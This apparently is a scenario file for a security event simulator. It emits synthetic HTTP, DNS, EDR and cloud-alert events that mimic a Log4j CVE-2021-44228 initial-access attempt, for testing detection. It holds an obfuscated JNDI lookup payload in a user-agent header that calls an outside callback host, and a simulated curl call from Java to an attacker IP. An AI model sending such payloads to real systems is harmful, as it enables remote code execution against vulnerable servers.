av 1

$attackerdomain = "xf.world80.log4j.binAryedge.io"
$attackerip = "134.209.163.248"

action http {
    $domain = "n0sf3ratu.com:8080"
    $port-dst = "8080"
    $user-agent = """${jndi:${lower:l}${lower:d}a${lower:p}://xf.world80.log4j.bin${upper:a}ryedge.io:80/callback}"""
    $resp-content-type = "text/html;charset=ISO-8859-1"
    $resp-content = file.readall(file.amidir("resp.html"))
    exec HTTPConnection
}

action dns {
    $domain = $attackerdomain
    $ip-dst = $attackerip
    exec DNSConnection
}

action tcp_syn {
    $port-dst = "80"
    
    exec TcpSynAck
}

#
# Some EDR data
#
action java_launching_curl {
    $ParentBaseFileName = "java"
    $ImageFileName = "/usr/bin/java"
    $CommandLine = "curl -s ${attackerip}/?curl"
    $event_platform = "Lin"
    
    exec CrowdstrikeProcessRollup2
}

message "user agent = ${user-agent}"

action gcp {
    $uri = $user-agent
    $referer = $user-agent
    $rule_desc = "Initial Access detected leveraging Log4j CVE-2021-44228"
    $rule_name = "log4_initialaccess"
    $org = "Enron Corp. Inc."
    
    exec GoogleCloudSecurityCommandCenterNotification
}
